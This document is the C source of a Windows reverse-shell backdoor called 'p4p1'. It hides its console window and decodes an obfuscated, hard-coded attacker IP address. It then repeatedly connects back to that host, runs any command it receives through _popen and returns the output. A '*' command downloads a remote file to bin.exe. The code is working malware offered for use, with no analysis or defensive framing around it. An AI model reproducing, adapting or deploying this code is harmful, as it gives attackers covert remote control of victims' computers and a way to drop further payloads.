#include "p4p1-h_win.h"

int main(int argc, char * argv[])
{
	if(argc == 1)
		stealth();
	fileWrapper file;

    // Create the basic variables so that you can get the port data
	int portno;     //number of port
	char ip[16];
	char ipchar[16];
	char portchar[6];   //Char retrieved from .cfg file
	FILE * fp = fopen("port.cfg", "r"); //Open up the cfg file
	FILE * fip = fopen("ip.cfg", "r");

	if(fp == NULL){
		file.portno = 4441;      //If no file set up default port to prevent errors
	} else {
		int i = 0;
		char c;
		while( (c = fgetc(fp)) != EOF){     // Get char from file while not at EOF
			portchar[i] = c;
			i++;
		}
		portchar[i+1] = '\0';               //Terminate string

		file.portno = atoi(portchar);            //Set up custom port
		fclose(fp);
	}

	if(fip == NULL){
		char ipjib[14] = "97/358/316/213";
		char corip[15];

		int i;

		for(i = 0; i < strlen(ipjib); i++){
			char ch;
			ch = ipjib[i];
			corip[i] = decr(ch);
		}
		corip[14] = '\0';

		strcpy(file.ip, corip);

	} else {
		int i = 0;
		char c;
		while( (c = fgetc(fip)) != EOF){     // Get char from file while not at EOF
			ipchar[i] = c;
			i++;
		}
		ipchar[i] = '\0';

		strcpy(file.ip, ipchar);

		fclose(fip);
	}

	printf("%s:%d", file.ip, file.portno);

	//Main program
	while(1){

		//startup sa
		WSADATA wsa;
		if(WSAStartup(MAKEWORD(2, 2), &wsa) != NO_ERROR){
			goto close;
		}

		/* initialize socket */
		SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if(s == INVALID_SOCKET){
			goto close;
		}

		/* setup variables */
		int cn;							//connect
		FILE *pPipe;						//command pipe
		int bytesSent;                  //number of bytes ent
		int bytesRecv;              // number of bytes received
		char sessionID[5] = "";					// Session id given by serv
		char buf[BUFSIZE] = "";					//buf
		char prompt[10] = "\n<p4p1 />";

		bytesSent = 0;
		bytesRecv = SOCKET_ERROR;

		struct sockaddr_in client;				//server to connect information
		client.sin_family = AF_INET;
		client.sin_port = htons(file.portno);
		client.sin_addr.s_addr = inet_addr(file.ip);	//this should not be hard coded.



		/* create pointers so that the synthacts gets faster*/
		int * pbs = &bytesSent;
		int * pbr = &bytesRecv;

		/* connect */

		do{
			cn = connect(s, (SOCKADDR*) &client, sizeof(client));
		} while( cn == SOCKET_ERROR);

		/* receive session ID */
		if(cn != SOCKET_ERROR){

			/*Recv sessionID*/
			*pbr = SOCKET_ERROR;
			sessionID[0] = wrecvsid(s, BUFSIZE, pbr);

			/*Send ui with session id*/
			if(sendui(s, sessionID[0], pbs) == 1){
				goto close;
			}

		}
		/*
		 *End of session id blocks
		 **/

		while(cn != SOCKET_ERROR){

			/*
			 *Send Prompt if no session ID
			 **/
			if(sessionID[0] == '0'){
				*pbs = send(s, prompt, sizeof(prompt), 0);
				if(*pbs == SOCKET_ERROR) { //server disconnected!
					if(WSAGetLastError() != WSAECONNREFUSED
					|| WSAGetLastError() == WSAECONNRESET){
						break;
					} else {
						goto close;
					}
				}
			}

			*pbr = SOCKET_ERROR;

			while(*pbr == SOCKET_ERROR){
				*pbr = recv(s, buf, BUFSIZE, 0);
				if(*pbr == 0 || *pbr == WSAECONNRESET){
					break;
				}

				if(bytesRecv < 0){
					return -1;
				} else {
					/*process received data*/
					if(iscommand(buf[0]) == 1 || iscommand(buf[0]) == 2){

						if(iscommand(buf[0]) == 2){	// exit command
							memset(buf, 0, BUFSIZE);
							goto close;
						} else if (iscommand(buf[0]) == 1) { //file download command
							memset(buf, 0, BUFSIZE);
							strcpy(buf, "#!url >");

							*pbs = send(s, buf, BUFSIZE, 0);
							if(*pbs == SOCKET_ERROR) {
								if(WSAGetLastError() != WSAECONNREFUSED
								|| WSAGetLastError() == WSAECONNRESET){
									break;
								} else {
									goto close;
								}
							}

							memset(buf, 0, BUFSIZE);
							*pbr = SOCKET_ERROR;
							while(*pbr == SOCKET_ERROR){
								*pbr = recv(s, buf, BUFSIZE, 0);
								if(*pbr == 0 || *pbr == WSAECONNRESET){
									break;
								}

								if(*pbr < 0){
									goto close;
								} else {
									download(buf);
									memset(buf, 0, BUFSIZE);
									strcpy(buf, "file downloaded\n");
								}
							}
						} else {
							memset(buf, 0, BUFSIZE);
						}

					} else {

						if( (pPipe = _popen( buf, "r" )) == NULL ){
							memset(buf, 0, BUFSIZE);
							strcpy(buf, "error in command");
							printf("error in cmd\n");
						} else {
							memset(buf, 0, BUFSIZE);
							int i = 0;
							char ch;
							while((ch = fgetc(pPipe)) != EOF){
								buf[i] = ch;
								i++;
							}
						}

					}
				}
			}

			/*
			 * Send back output
			 **/
			*pbs = send(s, buf, BUFSIZE, 0);
			if(*pbs == SOCKET_ERROR) {
				if(WSAGetLastError() != WSAECONNREFUSED
				|| WSAGetLastError() == WSAECONNRESET){
					break;
				} else {
					goto close;
				}
			}

		}	// end of the while connected loop.
		close:
		WSACleanup();
		_pclose(pPipe);
	}//end of main while loop.
	return 0;
}

/*
 * get buf and check if p4p1 custom command
 */
int iscommand(char buf)
{
	if(buf == '*'){
		return 1;
	} else if(buf == '&') {
		return 2;
	} else {
		return 0;
	}
}

/*Downloader func
 */

int download(char * url)
{
	char path[100] = "bin.exe";
	int r = 1;
	HMODULE hDll;
	UDTF URLDownloadToFile;


	if((hDll = LoadLibrary("urlmon"))) {
		if((URLDownloadToFile = (UDTF)GetProcAddress(hDll, "URLDownloadToFileA"))) {
			if(URLDownloadToFile(0, url, path, 0, 0) == 0)
				r = 0;
	}
		FreeLibrary(hDll);
	}

	return r;
}

/*
 * wrapper for recv the sessionid
 **/
char wrecvsid(int sock, int size, int *br)
{
	int pbr = *(int *)br;
	char buf[size];
	pbr = SOCKET_ERROR;
	while(pbr == SOCKET_ERROR){
		pbr = recv(sock, buf, size, 0);
			if(pbr == 0 || pbr == WSAECONNRESET){
				break;
			}

			if(pbr < 0){
				return -1;
			} else {
				return buf[0];
			}
	}

}

/*
 * Wrapper to send prompt
 */
int sendui(int s, char uin, int * bs)
{
	int pbs = *(int *)bs;
	char ui[95] = "       _ _       _\n  _ __| | | _ __/ |\n | '_ \\_  _| '_ \\ |\n | .__/ |_|| .__/_|\n |_|       |_|\n\0";
	char uivpn[146] = "      _ _       _\n _ __| | | _ __/ |_ ___ __ _ _\n| '_ \\_  _| '_ \\ \\ \\V / '_ \\ ' \\\n| .__/ |_|| .__/_|\\\\_/| .__/_||_|\n|_|       |_|        |_|    \n\0";

	if(uin == '0'){
		pbs = send(s, ui, sizeof(ui), 0);
	        if(pbs == SOCKET_ERROR) { //server disconnected!
	        	if(WSAGetLastError() != WSAECONNREFUSED
	                || WSAGetLastError() == WSAECONNRESET){
	                	return 1;
	                } else {
	       	                return 1;
	                }
		}
	}

	if(uin == '1'){
		pbs = send(s, uivpn, sizeof(uivpn), 0);
                if(pbs == SOCKET_ERROR) { //server disconnected!
                        if(WSAGetLastError() != WSAECONNREFUSED
                        || WSAGetLastError() == WSAECONNRESET){
                                return 1;
                        } else {
                                return 1;
                        }
                }
	}


	return 0;
}

void stealth()
{
	HWND stealth;
	AllocConsole();
	stealth=FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}

/*
 *Verry simple crypo to hide some stuff
 **/
char incr(char ch)
{
	return ch+1;
}

char decr(char ch)
{
	return ch-1;
}
